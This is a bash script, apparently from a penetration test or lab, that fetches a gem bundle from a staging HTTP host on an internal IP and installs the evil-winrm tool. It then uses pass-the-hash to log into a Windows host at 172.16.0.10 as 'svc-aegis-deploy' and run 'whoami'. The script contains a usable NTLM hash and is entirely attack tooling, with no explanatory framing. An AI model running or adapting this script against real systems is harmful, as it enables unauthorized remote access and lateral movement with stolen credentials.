#!/bin/bash
set -e
cd /tmp
curl -fsSL -o ew_gems.tgz http://10.10.15.183:8090/ew_gems.tgz
rm -rf gems && mkdir gems && tar -xzf ew_gems.tgz -C gems
cd gems
# install gems for user
gem install --user-install --local *.gem 2>&1 | tee /tmp/gem_install.log | tail -40
export PATH="$HOME/.local/share/gem/ruby/3.3.0/bin:$PATH"
which evil-winrm || find $HOME -name evil-winrm 2>/dev/null | head
evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa -c 'whoami' 2>&1 | tee /tmp/ew_whoami.out
echo EW_DONE
